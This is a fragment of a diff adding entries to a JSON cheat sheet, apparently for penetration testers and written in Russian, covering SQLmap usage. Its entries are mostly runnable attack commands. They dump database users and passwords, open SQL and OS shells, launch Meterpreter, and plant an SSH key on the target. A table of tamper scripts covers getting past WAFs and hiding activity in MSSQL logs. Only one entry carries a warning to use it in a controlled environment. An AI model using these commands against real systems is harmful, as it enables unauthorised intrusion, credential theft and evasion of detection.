+      "body": "sqlmap --url=\"<url>\" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs"
+    },
+    {
+      "subcategory": "SQLmap",
+      "title": "SQLmap — запрос из файла и точка инъекции",
+      "language": "bash",
+      "tags": ["sqlmap", "tooling"],
+      "body": "# из сохранённого HTTP-запроса\nsqlmap -r request.txt\n\n# кастомная точка инъекции через * \nsqlmap -u \"http://example.com\" --data \"username=admin&password=pass\" --headers=\"x-forwarded-for:127.0.0.1*\""
+    },
+    {
+      "subcategory": "SQLmap",
+      "title": "SQLmap — second-order",
+      "language": "bash",
+      "tags": ["sqlmap", "tooling", "second-order"],
+      "body": "sqlmap -r /tmp/r.txt --dbms MySQL --second-order \"http://targetapp/wishlist\" -v 3"
+    },
+    {
+      "subcategory": "SQLmap",
+      "title": "SQLmap — получение shell",
+      "language": "bash",
+      "tags": ["sqlmap", "tooling", "rce"],
+      "body": "# SQL shell\nsqlmap -u \"http://example.com/?id=1\" -p id --sql-shell\n\n# OS shell\nsqlmap -u \"http://example.com/?id=1\" -p id --os-shell\n\n# Meterpreter\nsqlmap -u \"http://example.com/?id=1\" -p id --os-pwn\n\n# запись SSH-ключа\nsqlmap -u \"http://example.com/?id=1\" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/"
+    },
+    {
+      "subcategory": "SQLmap",
+      "title": "SQLmap — crawl и авто-эксплуатация",
+      "language": "bash",
+      "tags": ["sqlmap", "tooling"],
+      "body": "# ВНИМАНИЕ: только в контролируемой среде — отправляет формы (может задеть delete/destroy)\nsqlmap -u \"http://example.com/\" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3"
+    },
+    {
+      "subcategory": "SQLmap",
+      "title": "SQLmap — tamper-скрипты и proxy",
+      "language": "bash",
+      "tags": ["sqlmap", "tooling", "waf-bypass"],
+      "body": "# tamper для обхода WAF\nsqlmap -u \"http://target.com/vuln.php?id=1\" --tamper=<tamper-script-name>\n\n# суффикс/префикс\nsqlmap -u \"http://example.com/?id=1\" -p id --suffix=\"-- \"\n\n# через прокси (Burp)\nsqlmap -u \"http://www.target.com\" --proxy=\"http://127.0.0.1:8080\""
+    },
+    {
+      "subcategory": "SQLmap",
+      "title": "SQLmap — самые ходовые tamper-скрипты",
+      "language": "table",
+      "tags": ["sqlmap", "tooling", "waf-bypass"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Tamper", "Описание"],
+          "rows": [
+            ["space2comment.py", "Заменяет пробел на комментарии /**/"],
+            ["space2mysqlblank.py", "Заменяет пробел на случайный пробельный символ из набора (MySQL)"],
+            ["between.py", "Заменяет > на 'NOT BETWEEN 0 AND #'"],
+            ["equaltolike.py", "Заменяет = на LIKE"],
+            ["charencode.py", "URL-кодирует все символы (SELECT -> %53%45%4C%45%43%54)"],
+            ["randomcase.py", "Случайный регистр ключевых слов"],
+            ["modsecurityversioned.py", "Оборачивает запрос в versioned-комментарий"],
+            ["unmagicquotes.py", "Заменяет ' на %bf%27 + комментарий"],
+            ["base64encode.py", "Base64 всего payload"],
+            ["sp_password.py", "Дописывает sp_password для маскировки в логах MSSQL"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "SQLmap",
+      "title": "SQLmap — сократить число запросов",
+      "language": "bash",
+      "tags": ["sqlmap", "tooling"],
+      "body": "# фильтр по технике\nsqlmap -u \"https://www.target.com/page.php?category=demo\" -p category --test-filter=\"Generic UNION query (NULL)\"\n\n# выбрать технику (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline)\nsqlmap -u \"https://www.target.com/page.php?id=1\" --technique=B\n\n# свой SQL-запрос после подтверждения инъекции\nsqlmap -u \"http://example.com/vulnerable.php?id=1\" --sql-query=\"SELECT version()\""
+    }
+  ]
+}
